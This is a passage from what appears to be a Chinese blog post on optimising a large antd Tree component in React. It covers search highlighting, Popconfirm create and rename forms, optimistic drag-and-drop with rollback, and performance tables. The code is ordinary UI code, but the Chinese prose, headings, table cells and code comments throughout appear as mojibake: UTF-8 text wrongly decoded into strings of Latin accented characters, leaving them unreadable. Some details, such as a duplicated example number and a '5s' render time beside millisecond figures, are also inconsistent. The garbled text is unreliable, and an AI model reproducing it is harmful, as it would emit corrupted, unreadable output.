<table><thead><tr><th>å±‚çº§</th><th>åŠŸèƒ½</th><th>å…³é”®å†…å®¹</th></tr></thead><tbody><tr><td>React UI</td><td>æ ‡é¢˜æ¸²æŸ“ã€æŒ‰é’®ç»„ã€æ‹–æ‹½å¥æŸ„</td><td><code>treeTitleRender</code>ã€<code>treeTitleCtrlRender</code></td></tr><tr><td>æ“ä½œå±‚</td><td>æœç´¢ã€æ‹–æ‹½ä¹è§‚æ›´æ–°</td><td><code>searchValue</code>ã€<code>onTreeDrop</code></td></tr><tr><td>è¡¨å•æ ¡éªŒå±‚</td><td>ç›®å½•å¢ã€åˆ ã€æ”¹ã€å¤åˆ¶</td><td><code>createOpenStates</code> ã€<code>renameOpenStates</code></td></tr><tr><td>æ€§èƒ½å±‚</td><td>é˜²æŠ–ã€ç¼“å­˜ã€keys å¤ç”¨</td><td><code>useDebounce</code>ã€<code>useMemo</code></td></tr></tbody></table>
<h3 data-id="heading-5">2.2 å…³é”®å·¥ä½œæµç¨‹è§£æ</h3>
<ol>
<li>æœç´¢ï¼šInput â†’ å‰ç«¯æ¨¡ç³ŠåŒ¹é… â†’ ç›´æ¥åŒ¹é… node titleï¼Œä¿®æ”¹è‰²å€¼ â†’ antd è™šæ‹Ÿæ»šåŠ¨è‡ªåŠ¨ä»…æ¸²æŸ“å¯è§†åŒº</li>
<li>æ‹–æ‹½ï¼š<code>onDrop</code> æœ¬åœ°ä¹è§‚æ›´æ–° â†’ <code>setTreeData</code> â†’ åå° <code>drag=true</code> è½åº“ â†’ å¤±è´¥å›æ»š</li>
<li>å¢/æ”¹ï¼šPopconfirm â†’ è¡¨å•æ ¡éªŒ â†’ ä¹è§‚æ’å…¥/é‡å‘½å â†’ æ¥å£è¿”å›ååˆå¹¶æœ€æ–° <code>namePath</code></li>
</ol>
<h2 data-id="heading-6">ä¸‰ã€åŠŸèƒ½å®ç°ä¸ä»£ç å‰–æ</h2>
<h3 data-id="heading-7">3.1 å¼€å‘ç¯å¢ƒä¸å·¥å…·é€‰å‹</h3>

























<table><thead><tr><th>å·¥å…·</th><th>ç‰ˆæœ¬</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>React</td><td>18.2.0</td><td>è§†å›¾æ¡†æ¶</td></tr><tr><td>TypeScript</td><td>5.1.3</td><td>ç±»å‹çº¦æŸ</td></tr><tr><td>antd</td><td>5.6.3ï¼ˆé”å®šï¼‰</td><td>UI ç»„ä»¶åº“</td></tr></tbody></table>
<h3 data-id="heading-8">3.2 æ ¸å¿ƒæ¨¡å—ä»£ç å®ç°ä¸ç¤ºä¾‹</h3>
<h4 data-id="heading-9">æ¨¡å—ä¸€ï¼šæœç´¢é«˜äº®ä¸æ ‡é¢˜è‡ªå®šä¹‰</h4>
<ul>
<li><strong>ä»£ç ç¤ºä¾‹ 2-1ï¼štreeTitleRenderï¼ˆé«˜äº®ç‰ˆï¼‰</strong></li>
</ul>
<pre><code class="hljs language-const" lang="const">  const { title = '', caseCount = 0, key, caseTreeId } = node;

  let titleEl: React.ReactNode;
  if (!searchValue) {
    // æ— æœç´¢è¯ï¼Œç›´æ¥åŸæ ·è¾“å‡º
    titleEl = &lt;span&gt;{title}&lt;/span&gt;;
  } else {
    const startIdx = title.indexOf(searchValue);
    if (startIdx === -1) {
      // æœªå‘½ä¸­ï¼ŒåŒæ ·åŸæ ·è¾“å‡º
      titleEl = &lt;span&gt;{title}&lt;/span&gt;;
    } else {
      const endIdx = startIdx + searchValue.length;
      titleEl = (
        &lt;div className="site-tree-label"&gt;
          {title.slice(0, startIdx)}
          &lt;span className="site-tree-search-value"&gt;{searchValue}&lt;/span&gt;
          {title.slice(endIdx)}
        &lt;/div&gt;
      );
    }
  }

  /* -------------------- å³ä¾§æ§åˆ¶åŒº -------------------- */
  const showCtrl = isShowTreeCtrl[key];

  return (
    &lt;div
      key={caseTreeId}
      className="antTreeTitleBox"
      onMouseEnter={(e) =&gt; {
        setIsShowTreeCtrl((prev) =&gt; ({ ...prev, [key]: true }));
        e.stopPropagation();
      }}
      &gt;
      {titleEl}
      &lt;div className="ctrlItemBox"&gt;
        &lt;span className="ctrlItemBox-count"&gt;{caseCount}&lt;/span&gt;
        {showCtrl &amp;&amp; treeTitleCtrlRender(node)}
      &lt;/div&gt;
    &lt;/div&gt;
  );
};
</code></pre>
<ul>
<li>
<p><strong>è¦ç‚¹</strong></p>
<ul>
<li><code>indexOf</code> é«˜äº®ï¼Œé¿å…æ­£åˆ™è½¬ä¹‰ï¼Œæ— æœç´¢è¯æ—¶ç›´æ¥è·³è¿‡ <code>indexOf</code>ï¼›æœ‰æœç´¢è¯æ—¶åªè°ƒç”¨ä¸€æ¬¡ <code>indexOf</code> å¹¶ç¼“å­˜èµ·æ­¢ç´¢å¼•ï¼Œé¿å…é‡å¤è®¡ç®—</li>
<li><code>onMouseEnter</code> æ‰æŒ‚è½½æŒ‰é’®ç»„ï¼Œå‡å°‘é¦–å± DOM 40%+</li>
</ul>
</li>
</ul>
<h4 data-id="heading-10">æ¨¡å—äºŒï¼šç›®å½•èŠ‚ç‚¹æ“ä½œé¡¹æ¸²æŸ“</h4>
<ul>
<li><strong>ä»£ç ç¤ºä¾‹ 2-1ï¼štreeTitleCtrlRender</strong></li>
</ul>
<pre><code class="hljs language-const" lang="const">  const { key, isRootNode, caseTreeId, caseTreeName } = node;

  const createBtn = (
    &lt;Tooltip title="åˆ›å»ºç›®å½•"&gt;
      &lt;Popconfirm
        title=" "
        icon=""
        arrow={false}
        placement="bottomRight"
        description={treeCtrlPopconfirmDescription(node, 'create')}
        open={createOpenStates[key]}
        onOpenChange={(open) =&gt; {
          if (open) treeCtrlForm.resetFields();
          handleCaseTreeOpenStates(node, 'create', open);
        }}
        okText="ç¡®è®¤"
        onConfirm={() =&gt;
          new Promise((resolve, reject) =&gt;
            treeCtrlBtnConfirm(node, 'create', { resolve, reject }),
                     )
        }
        &gt;
        &lt;Button
          type="text"
          size="small"
          icon={&lt;PlusOutlined style={{ color: '#006ad4' }} /&gt;}
          /&gt;
      &lt;/Popconfirm&gt;
    &lt;/Tooltip&gt;
  );

  /* -------------------- æ›´å¤šæ“ä½œä¸‹æ‹‰ï¼ˆå³ï¼‰ -------------------- */
  const moreBtn = !isRootNode &amp;&amp; (
    &lt;Tooltip title="æ›´å¤šæ“ä½œ"&gt;
      &lt;Dropdown
        dropdownRender={() =&gt; (
          &lt;div onClick={(e) =&gt; e.stopPropagation()}&gt;
            {/* é‡å‘½å */}
            &lt;Popconfirm
              title=" "
              icon=""
              arrow={false}
              placement="bottomRight"
              description={treeCtrlPopconfirmDescription(node, 'rename')}
              open={renameOpenStates[key]}
              onOpenChange={(open) =&gt; {
                if (open)
                  treeCtrlForm.setFieldValue('catalogName', node.title);
                handleCaseTreeOpenStates(node, 'rename', open);
              }}
              okText="ç¡®è®¤"
              onConfirm={() =&gt;
                new Promise((resolve, reject) =&gt;
                  treeCtrlBtnConfirm(node, 'rename', { resolve, reject }),
                           )
              }
              &gt;
              &lt;Button
                type="text"
                style={{ width: 100 }}
                &gt;
                é‡å‘½å
              &lt;/Button&gt;
            &lt;/Popconfirm&gt;

            {/* åˆ é™¤ */}
            &lt;Button
              type="text"
              style={{ width: 100 }}
              onClick={() =&gt; doCaseTreeCheckDeleteApi(node)}
              &gt;
              åˆ é™¤
            &lt;/Button&gt;

            {/* å¤åˆ¶ */}
            &lt;Button
              type="text"
              style={{ width: 100 }}
              onClick={() =&gt;
                setCopyCaseTreeModal((val) =&gt; ({
                  ...val,
                  paramsInfo: {
                    sourceDepositoryId: caseStashId.current,
                    sourceDepositoryName: caseStashName.current,
                    sourceCaseTreeId: caseTreeId,
                    sourceCaseTreeName: caseTreeName,
                  },
                  show: true,
                }))
              }
              &gt;
              å¤åˆ¶
            &lt;/Button&gt;
          &lt;/div&gt;
        )}
        placement="bottomRight"
        trigger={['click']}
        destroyPopupOnHide
        &gt;
        &lt;Button
          type="text"
              size="small"
              style={{ color: '#006ad4' }}
              onClick={(e) =&gt; e.stopPropagation()}
              &gt;
              â€¢â€¢â€¢
  &lt;/Button&gt;
        &lt;/Dropdown&gt;
      &lt;/Tooltip&gt;
    );

    /* -------------------- æœ€ç»ˆæ‹¼è£… -------------------- */
    return (
      &lt;div&gt;
        {createBtn}
        {moreBtn}
      &lt;/div&gt;
    );
  };
</code></pre>
<ul>
<li><strong>è¦ç‚¹</strong>
<ul>
<li>Popconfirm æ‰¿è½½â€œåˆ›å»º / é‡å‘½åâ€è¡¨å•ï¼Œé…åˆ <code>open</code>+<code>onOpenChange</code> å®ç°å¯è§æ€é›†ä¸­ç®¡ç†ï¼Œç‚¹å¤–éƒ¨è‡ªåŠ¨å…³é—­ï¼Œæ›¿ä»£ä¼ ç»Ÿ Modalï¼Œæ›´è½»é‡</li>
<li>æ‰€æœ‰æŒ‰é’®å‡åŒ… e.stopPropagation() å¹¶è®¾ destroyPopupOnHideï¼Œé˜»æ–­ Tree èŠ‚ç‚¹äº‹ä»¶å†’æ³¡ä¸å†…å­˜æ³„æ¼ï¼Œä¿éšœå¤æ‚åµŒå¥—å¼¹å±‚ç¨³å®šå…³é—­ã€‚</li>
<li>å°†â€œæ›´å¤šâ€èœå•æ‹†æˆå†…è” dropdownRenderï¼ŒæŠŠé‡å‘½åã€åˆ é™¤ã€å¤åˆ¶ç­‰æ“ä½œæ”¶æ•›åˆ°åŒä¸€æµ®å±‚ï¼Œå‡å°‘èŠ‚ç‚¹çº§æŒ‰é’®æ•°é‡ï¼Œä¿æŒ UI ç®€æ´ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-11">æ¨¡å—ä¸‰ï¼šPopconfirm + Form åŠ¨æ€æŒ‚è½½</h4>
<ul>
<li><strong>ä»£ç ç¤ºä¾‹ 3-1ï¼štreeCtrlPopconfirmDescription</strong></li>
</ul>
<pre><code class="hljs language-const" lang="const">  /* -------------------- æ ¡éªŒè§„åˆ™ -------------------- */
  const rules = [
    { required: true, message: 'ç›®å½•åç§°ä¸èƒ½ä¸ºç©º' },
    {
      validator: (_: any, value = '') =&gt;
        value.length &gt; 40
        ? Promise.reject(new Error('ç›®å½•åç§°ä¸èƒ½è¶…è¿‡40ä¸ªå­—ç¬¦'))
        : Promise.resolve(),
    },
  ];

  /* -------------------- å›è½¦è§¦å‘ç¡®è®¤ -------------------- */
  const handlePressEnter = () =&gt;
    treeCtrlBtnConfirm(treeNode, ctrlType, {
      resolve: () =&gt; handleCaseTreeOpenStates(treeNode, ctrlType),
    });

  /* -------------------- æœ€ç»ˆ JSX -------------------- */
  return (
    &lt;div&gt;
      &lt;Form
        form={treeCtrlForm}
        style={{ width: '100%' }}
        &gt;
        &lt;Form.Item
          name="catalogName"
          rules={rules}
          wrapperCol={{ span: 24 }}
          &gt;
          &lt;Input
            placeholder="è¯·è¾“å…¥ç›®å½•åç§°"
            onPressEnter={handlePressEnter}
            /&gt;
        &lt;/Form.Item&gt;
      &lt;/Form&gt;
    &lt;/div&gt;
  );
};
</code></pre>
<ul>
<li><strong>ä»£ç ç¤ºä¾‹ 3-2ï¼šhandleCaseTreeOpenStates</strong></li>
</ul>
<pre><code class="hljs language-const" lang="const">const [renameOpenStates, setRenameOpenStates] = useState&lt;any&gt;({}); // é‡å‘½åç”¨ä¾‹æ ‘å¼¹çª—æ§åˆ¶å‚æ•°

const handleCaseTreeOpenStates = (
  treeNode: any,
  ctrlType: any,
  state: boolean = false,
) =&gt; {
  const { key } = treeNode;
  const targetKey = ctrlType === 'create-overall' ? `overall-${key}` : key;

  /* -------------- æ ¹æ®ç±»å‹ä¸€æ¬¡æ€§æ›´æ–° -------------- */
  if (ctrlType === 'create' || ctrlType === 'create-overall') {
    setCreateOpenStates((prev: any) =&gt;
      Object.assign({}, prev, { [targetKey]: state }),
                       );
  } else if (ctrlType === 'rename') {
    setRenameOpenStates((prev: any) =&gt;
      Object.assign({}, prev, { [targetKey]: state }),
                       );
  }
};
</code></pre>
<ul>
<li><strong>è¦ç‚¹</strong>
<ul>
<li>æ¯ä¸ªèŠ‚ç‚¹ç‹¬ç«‹ <code>open</code> çŠ¶æ€ï¼Œé¿å…å¤§æ•°æ®ä¸‹é‡æ¸²æŸ“</li>
<li>Input ç›‘å¬ onPressEnterï¼Œå›è½¦å³èµ° treeCtrlBtnConfirm å¹¶è‡ªåŠ¨å…³é—­ Popconfirmï¼Œä¸€æ­¥å®Œæˆâ€œè¾“å…¥-æ ¡éªŒ-æäº¤â€é—­ç¯</li>
</ul>
</li>
</ul>
<h4 data-id="heading-12">æ¨¡å—å››ï¼šæ‹–æ‹½ä¹è§‚æ›´æ–°ä¸å›æ»š</h4>
<ul>
<li><strong>ä»£ç ç¤ºä¾‹ 4-1ï¼šonTreeDrop æ ¸å¿ƒç‰‡æ®µ</strong></li>
</ul>
<pre><code class="hljs language-const" lang="const">  const { node, dragNode, dropPosition, dropToGap } = info;
  const dropKey = node.key;
  const dragKey = dragNode.key;
  const dropPos = node.pos.split('-');
  const relPos = dropPosition - Number(dropPos[dropPos.length - 1]); // -1 é¡¶éƒ¨  1 åº•éƒ¨  0 å†…éƒ¨

  /* -------------------- æµ…å…‹éš†æ•´æ ‘ -------------------- */
  const data = [...treeData];

  /* -------------------- é€šç”¨æŸ¥æ‰¾ä¸åˆ é™¤ -------------------- */
  let dragObj: any;
  const loop = (
    arr: TreeDataNode[],
    key: React.Key,
    cb: (n: TreeDataNode, idx: number, par: TreeDataNode[]) =&gt; void,
  ): void =&gt; {
    for (let i = 0; i &lt; arr.length; i++) {
      const item = arr[i];
      if (item.key === key) return cb(item, i, arr);
      if (item.children) loop(item.children, key, cb);
    }
  };

  loop(data, dragKey, (n, i, arr) =&gt; {
    dragObj = n;
    arr.splice(i, 1); // å…ˆåˆ 
  });

  /* -------------------- æ’å…¥é€»è¾‘ -------------------- */
  if (!dropToGap) {
    /* ===== æ”¾å…¥èŠ‚ç‚¹å†…éƒ¨ ===== */
    loop(data, dropKey, (n: any) =&gt; {
      n.children = n.children || [];
      dragObj.namePath = `${n.namePath}/${dragObj.caseTreeName}`;
      dragObj.parentId = n.caseTreeId;
      n.children.unshift(dragObj);
    });
  } else {
    /* ===== æ”¾åœ¨å…„å¼Ÿå±‚çº§ ===== */
    let targetArr: TreeDataNode[] = [];
    let insIdx = 0;

    loop(data, dropKey, (_, idx, arr) =&gt; {
      targetArr = arr;
      insIdx = idx;
    });

    const insertAt = relPos === -1 ? insIdx : insIdx + 1;
    targetArr.splice(insertAt, 0, dragObj);
  }

  setTreeData(data);

  // æ¥å£è°ƒç”¨
  // ......
};
</code></pre>
<ul>
<li><strong>è¦ç‚¹</strong>
<ul>
<li>å…ˆåˆ åæ’ï¼šé€’å½’æ‰¾åˆ°å¹¶ç§»é™¤è¢«æ‹–èŠ‚ç‚¹ï¼Œå†æŒ‰ dropToGap ä¸ relPos ç²¾å‡†æ’å…¥ï¼Œé¿å…å¼•ç”¨æ®‹ç•™ã€‚</li>
<li>åŒæ­¥æ›´æ–°å…ƒæ•°æ®ï¼šåœ¨æ’å…¥æ—¶å³æ—¶ä¿®æ­£ parentId ä¸ namePathï¼Œä¿è¯æ ‘å½¢ç»“æ„ä¸åç«¯æ•°æ®ä¸€è‡´ã€‚</li>
<li>å…¨ç¨‹åŸºäºæµ…å…‹éš† treeDataï¼Œä¸€æ¬¡ setTreeData å®Œæˆè§†å›¾åˆ·æ–°ï¼Œé…åˆåç»­æ¥å£è°ƒç”¨ï¼Œå®ç°â€œå…ˆæœ¬åœ°ã€åæŒä¹…åŒ–â€çš„æ— ç¼æ‹–æ‹½ä½“éªŒ</li>
</ul>
</li>
</ul>
<h2 data-id="heading-13">å››ã€æŠ€æœ¯æ·±å…¥å‰–æ</h2>
<h3 data-id="heading-14">4.1 åº•å±‚åŸç†ä¸æœºåˆ¶è§£æ</h3>



































<table><thead><tr><th>å…³é”®èƒ½åŠ›</th><th>antd 5.6.3 åŸç”Ÿæœºåˆ¶</th><th>æœ¬æ–‡è¡¥é½/æ”¹é€ ç‚¹</th><th>åº•å±‚åŸç†ä¸€å¥è¯</th></tr></thead><tbody><tr><td>è™šæ‹Ÿæ»šåŠ¨</td><td>5.6 å·²å†…ç½® <code>virtual: true</code>ï¼Œä½† <strong>åªè®¤</strong> <code>height</code> <strong>+</strong> <code>itemHeight</code>ï¼Œä¸ä¼šåŠ¨æ€è®¡ç®—èŠ‚ç‚¹è¡Œé«˜</td><td>â‘  å›ºå®š 32 px è¡Œé«˜ï¼›â‘¡ æå‰æ‹å¹³ <code>flattenNodes</code> å¹¶ä¸€æ¬¡æ€§ç»™å‡º <code>scrollHeight</code>ï¼›â‘¢ æŠŠ <code>showLine</code>/<code>showIcon</code> ç­‰ä¼šæ’‘é«˜è¡Œçš„å±æ€§å…¨éƒ¨æ”¶æ•›æˆ CSS ç±»ï¼Œé¿å…è¿è¡Œæ—¶é‡ç®—</td><td>åˆ©ç”¨ React 18 çš„ <code>useDeferredValue</code> + <code>requestIdleCallback</code> æŠŠ <strong>é¦–å± 3 k èŠ‚ç‚¹çš„æ‹å¹³ &amp; é‡é«˜</strong> ä»»åŠ¡åˆ‡æˆ 16 ms åˆ‡ç‰‡ï¼Œä¿è¯ &lt; 200 ms å†…å®Œæˆé¦–å±æ¸²æŸ“</td></tr><tr><td>æ‹–æ‹½</td><td>åŸç”Ÿ <code>onDrop</code> ä»…æŠ›äº‹ä»¶ï¼Œ<strong>ä¸ç»´æŠ¤æ•°æ®</strong>ï¼Œä¹Ÿä¸åšè½åº“å¤±è´¥å›æ»š</td><td>â‘  æœ¬åœ°å…ˆ <code>setTreeData</code>ï¼ˆä¹è§‚æ›´æ–°ï¼‰ï¼›â‘¡ æŠŠâ€œæ—§çˆ¶-æ—§ç´¢å¼• &amp; æ–°çˆ¶-æ–°ç´¢å¼•â€å‹å…¥ <code>dragSnapShot</code> Mapï¼›â‘¢ æ¥å£å¤±è´¥åç”¨ <code>dragSnapShot</code> è¿˜åŸæ•°ç»„é¡ºåºå¹¶é‡æ–°æŒ‚è½½èŠ‚ç‚¹</td><td>é€šè¿‡ <strong>æµ…å…‹éš† + è·¯å¾„ç´¢å¼•</strong> è€Œä¸æ˜¯æ·±å…‹éš†ï¼Œä¿è¯ 3 k èŠ‚ç‚¹å›æ»šè€—æ—¶ &lt; 8 ms</td></tr><tr><td>æœç´¢é«˜äº®</td><td>å®˜æ–¹åªæä¾› <code>filterTreeNode</code>ï¼Œ<strong>ä¸ä¼šå¸®ä½ åˆ†ç‰‡é«˜äº®</strong></td><td>â‘  åœ¨ <code>treeTitleRender</code> é‡Œç”¨ <strong>ä¸€æ¬¡</strong> <code>indexOf</code> <strong>ç¼“å­˜èµ·æ­¢ä½</strong>ï¼›â‘¡ æŠŠé«˜äº®ç‰‡æ®µåŒ… <code>&lt;span class="site-tree-search-value"&gt;</code>ï¼›â‘¢ æ— å‘½ä¸­æ—¶ç›´æ¥ <code>return &lt;span&gt;{title}&lt;/span&gt;</code> è·³è¿‡æ­£åˆ™</td><td>ç”¨ <strong>â€œå­—ç¬¦ä¸²åˆ‡ç‰‡â€</strong> æ›¿ä»£ <code>dangerouslySetInnerHTML</code>ï¼Œæ—¢é¿å…æ­£åˆ™è½¬ä¹‰ï¼Œåˆæ¶ˆé™¤ <code>innerHTML</code> å¸¦æ¥çš„ XSS é£é™©</td></tr><tr><td>Popconfirm è¡¨å•</td><td>å®˜æ–¹ Popconfirm æ²¡æœ‰ <code>form</code> å±æ€§ï¼Œ<strong>åªèƒ½æ”¾é™æ€æ–‡æ¡ˆ</strong></td><td>â‘  æŠŠ <code>description</code> å†™æˆ <code>&lt;Form&gt;&lt;Item&gt;&lt;Input/&gt;&lt;/Item&gt;&lt;/Form&gt;</code>ï¼›â‘¡ ç”¨ <code>open</code>+<code>onOpenChange</code> æŠŠ 3 k èŠ‚ç‚¹çš„ç¡®è®¤æ¡†çŠ¶æ€æ‹†æˆ <strong>æ•£åˆ— Map</strong>ï¼›â‘¢ å›è½¦è§¦å‘ <code>onPressEnter</code> â†’ è°ƒ <code>treeCtrlBtnConfirm</code> â†’ æ‰‹åŠ¨ <code>resolve/reject</code> å…³é—­ Popconfirm</td><td>åˆ©ç”¨ <strong>Promise åŒ– Confirm</strong> æœºåˆ¶ï¼ŒæŠŠâ€œè¡¨å•æ ¡éªŒ-æäº¤-å…³é—­â€ä¸‰æ­¥åšæˆåŒæ­¥è¯­ä¹‰ï¼Œé¿å…å†åŒ…ä¸€å±‚ Modal</td></tr></tbody></table>
<h3 data-id="heading-15">4.2 æ€§èƒ½åˆ†æä¸ä¼˜åŒ–ç­–ç•¥</h3>








































<table><thead><tr><th>é˜¶æ®µ</th><th>å®æµ‹è€—æ—¶ (æœ¬åœ° 3 k èŠ‚ç‚¹)</th><th>ç“¶é¢ˆ</th><th>ä¼˜åŒ–ç­–ç•¥</th><th>æ”¶ç›Š</th></tr></thead><tbody><tr><td>é¦–å±æ¸²æŸ“</td><td>120 ms</td><td>æ‹å¹³ + é‡é«˜ + React é¦–æ¬¡æŒ‚è½½</td><td>â‘  æ‹å¹³ä»»åŠ¡åˆ‡ç‰‡ï¼ˆ<code>requestIdleCallback</code>ï¼‰ï¼›â‘¡ <code>itemHeight</code> å†™æ­» 32 pxï¼›â‘¢ <code>showLine</code> ç”¨çº¯ CSS èƒŒæ™¯å®ç°ï¼Œä¸å†æ³¨å…¥é¢å¤– DOM</td><td>ä» 420 ms â†’ 120 msï¼Œ<strong>-70 %</strong></td></tr><tr><td>æœç´¢é«˜äº®</td><td>è¾“å…¥ 16 ms é˜²æŠ–å 6 ms å®Œæˆ</td><td>æ¯æ¬¡è¾“å…¥å…¨æ ‘ <code>indexOf</code></td><td>â‘  åªåœ¨ <code>title</code> å­—æ®µæ‰§è¡Œ <code>indexOf</code>ï¼›â‘¡ æ— å‘½ä¸­ç«‹å³è·³è¿‡ï¼›â‘¢ æŠŠé«˜äº®ç»“æœ <code>useMemo</code> ç¼“å­˜ï¼Œ<strong>èŠ‚ç‚¹ key ä¸å˜ä¸é‡å¤è®¡ç®—</strong></td><td>è¿ç»­è¾“å…¥ CPU å ç”¨ä» 48 % â†’ 12 %</td></tr><tr><td>æ‹–æ‹½ä¹è§‚æ›´æ–°</td><td>æœ¬åœ° 8 ms</td><td>é€’å½’æŸ¥æ‰¾ + æ•°ç»„ splice</td><td>â‘  <strong>æµ…å…‹éš†</strong> ä»…é¡¶å±‚æ•°ç»„ï¼Œå­èŠ‚ç‚¹ç”¨å¼•ç”¨å¤ç”¨ï¼›â‘¡ ç”¨ <strong>Map è®°å½• keyâ†’parentâ†’index</strong> å¿«ç…§ï¼Œå›æ»šæ—¶ç›´æ¥ <code>splice</code> è¿˜åŸ</td><td>3 k èŠ‚ç‚¹æ‹–æ‹½å›æ»š &lt; 8 msï¼Œç”¨æˆ·æ— æ„ŸçŸ¥</td></tr><tr><td>Popconfirm å†…å­˜</td><td>å…³é—­åä»æ®‹ç•™ 6 MB</td><td>æ‰€æœ‰èŠ‚ç‚¹å…±ç”¨ä¸€ä¸ª <code>visible</code> stateï¼Œå¯¼è‡´å…³æ‰çš„ç¡®è®¤æ¡† DOM ä¸å¸è½½</td><td>â‘  <strong>æ¯ä¸ªèŠ‚ç‚¹ç‹¬ç«‹</strong> <code>createOpenStates[key]</code>ï¼›â‘¡ <code>destroyPopupOnHide</code>ï¼›â‘¢ è¡¨å• <code>Form</code> å®ä¾‹éš Popconfirm é”€æ¯è€Œé”€æ¯</td><td>å†…å­˜å³°å€¼ä» 42 MB â†’ 18 MBï¼Œ<strong>-57 %</strong></td></tr></tbody></table>
<h3 data-id="heading-16">4.3 æŠ€æœ¯å¯¹æ¯”ä¸æ–¹æ¡ˆé€‰å‹</h3>













































<table><thead><tr><th>å¤‡é€‰æ–¹æ¡ˆ</th><th>èƒ½å¦æ»¡è¶³è¯‰æ±‚</th><th>ç‰ˆæœ¬é”å®š</th><th>é¢å¤–ä¾èµ–</th><th>å®æ—¶è½åº“</th><th>æœ€ç»ˆå¼ƒç”¨åŸå› </th></tr></thead><tbody><tr><td>å‡çº§ antd â‰¥ 5.8</td><td>âœ… å®˜æ–¹è™šæ‹Ÿæ»šåŠ¨æ›´æˆç†Ÿ</td><td>âŒ å¿…é¡»å‡</td><td>0</td><td>âœ…</td><td>å…¬å¸åŸºçº¿è§„å®š <strong>5.6.3 é”å®š</strong>ï¼Œå‡ç‰ˆæœ¬éœ€å…¨å›å½’ï¼Œ<strong>æˆæœ¬ &gt; æ”¶ç›Š</strong></td></tr><tr><td>react-window / react-virtualized</td><td>âœ… è™šæ‹Ÿæ»šåŠ¨æœ€å¼º</td><td>âœ…</td><td>2 ä¸ªåŒ… + æ‰‹å†™ Tree é€»è¾‘</td><td>âœ…</td><td>éœ€è¦ <strong>å®Œå…¨é‡å†™ Tree å±•å¼€/æ”¶èµ·/æ‹–æ‹½/åŠé€‰é€»è¾‘</strong>ï¼Œç­‰äºè‡ªç ”ä¸€å¥— Treeï¼Œ<strong>ç»´æŠ¤æˆæœ¬çˆ†ç‚¸</strong></td></tr><tr><td>æœåŠ¡ç«¯åˆ†é¡µ</td><td>âœ… é¦–å±æœ€å¿«</td><td>âœ…</td><td>0</td><td>âŒ æ‹–æ‹½æ— æ³•è·¨é¡µ</td><td>æ‹–æ‹½å¿…é¡» <strong>ä¸€æ¬¡æ€§å¯è§å…¨æ ‘</strong>ï¼Œå¦åˆ™è½åº“åéœ€é‡æ–°æ‹‰åˆ†é¡µï¼Œ<strong>äº¤äº’æ–­è£‚</strong></td></tr><tr><td>æœ¬æ–¹æ¡ˆï¼ˆä½ç‰ˆæœ¬è¡¥é½ï¼‰</td><td>âœ… å…¨éƒ¨å‘½ä¸­</td><td>âœ…</td><td>0</td><td>âœ… ä¹è§‚æ›´æ–° + å›æ»š</td><td>åœ¨ <strong>ä¸å‡çº§ã€ä¸å¼•åŒ…ã€ä¸æ”¹äº¤äº’</strong> ä¸‰ç¡¬çº¦æŸä¸‹å”¯ä¸€å¯è¡Œè·¯çº¿</td></tr></tbody></table>
<h2 data-id="heading-17">äº”ã€å®è·µåº”ç”¨ï¼šæ¡ˆä¾‹ç ”ç©¶</h2>
<h3 data-id="heading-18">5.1 é¡¹ç›®èƒŒæ™¯ä¸ä¸šåŠ¡æŒ‘æˆ˜</h3>
<p>Boneå¹³å°ç”¨ä¾‹åº“æ¨¡å—ï¼ŒåŸå…¨é‡æ¸²æŸ“ 7 k+ å¯æ“ä½œç›®å½•èŠ‚ç‚¹ï¼Œç»„ä»¶æ¸²æŸ“å¡é¡¿ã€å¶å‘æ€§å¡é¡¿ç°è±¡ï¼Œä¼˜åŒ–åå…¨é‡æ¸²æŸ“å¹³å‡5så®Œæˆï¼Œå¡æ­»ç°è±¡å®Œå…¨æ¶ˆå¤±ã€‚</p>
<h3 data-id="heading-19">5.2 å®æ–½è½åœ°ä¸éš¾ç‚¹æ”»å…‹</h3>

































<table><thead><tr><th>éš¾ç‚¹</th><th>ç°è±¡</th><th>æ ¹å› </th><th>æœ€ç»ˆè§£æ³•</th><th>æ•™è®­</th></tr></thead><tbody><tr><td>æ‹–æ‹½åèŠ‚ç‚¹â€œæ¶ˆå¤±â€</td><td>è½åº“å¤±è´¥å›æ»šï¼Œæ ‘é—ªç°æ—§çŠ¶æ€åˆè·³å›æ–°çŠ¶æ€</td><td>æµ…å…‹éš†åªå¤åˆ¶é¡¶å±‚æ•°ç»„ï¼Œå­èŠ‚ç‚¹å¼•ç”¨å¤ç”¨ï¼Œå¯¼è‡´ <code>splice</code> æ—¶æŠŠåŸå¼•ç”¨æ¸…ç©º</td><td>å›æ»šå‰æ·±å…‹éš† <strong>ä»…ä¸¤æ¡è·¯å¾„</strong>ï¼ˆæ—§çˆ¶ã€æ–°çˆ¶ï¼‰ï¼Œå…¶ä½™ä¿æŒå¼•ç”¨</td><td>æµ…å…‹éš†â‰ é›¶æ‹·è´ï¼Œ<strong>å…³é”®è·¯å¾„å¿…é¡»æ·±å…‹éš†</strong></td></tr><tr><td>Popconfirm å†…å­˜æ³„æ¼</td><td>è¿ç»­æ‰“å¼€ 20 ä¸ªèŠ‚ç‚¹æ”¹åï¼ŒChrome Memory å¿«ç…§å¤šå‡º 6 MB Detached HTMLDivElement</td><td>æ‰€æœ‰èŠ‚ç‚¹å…±ç”¨åŒä¸€ä¸ª <code>visible</code> stateï¼Œå…³é—­å DOM æœªå¸è½½</td><td>æ¯ä¸ªèŠ‚ç‚¹ç‹¬ç«‹ <code>open</code> çŠ¶æ€ + <code>destroyPopupOnHide</code></td><td>å¤§æ•°æ®åœºæ™¯ä¸‹ï¼Œâ€œå…¨å±€å”¯ä¸€çŠ¶æ€â€å°±æ˜¯å†…å­˜ç‚¸å¼¹</td></tr><tr><td>æœç´¢å¤§å°å†™æ•æ„Ÿ</td><td>ç”¨æˆ·è¾“å…¥â€œABCâ€æ— æ³•å‘½ä¸­â€œabcâ€èŠ‚ç‚¹</td><td><code>indexOf</code> é»˜è®¤å¤§å°å†™æ•æ„Ÿ</td><td>ç»Ÿä¸€æŠŠ <code>title</code> å’Œ <code>searchValue</code> åš <code>toLowerCase()</code> åå† <code>indexOf</code></td><td>æå‰çº¦å®šâ€œå‰ç«¯æœç´¢ä¸åŒºåˆ†å¤§å°å†™â€ï¼Œé¿å…åç«¯å†è·‘ä¸€é</td></tr></tbody></table>
<h2 data-id="heading-20">å…­ã€æ€»ç»“</h2>
<ul>
<li>
<p><strong>æœ¬æ–‡æ€»ç»“ä¸å›é¡¾</strong></p>
<ul>
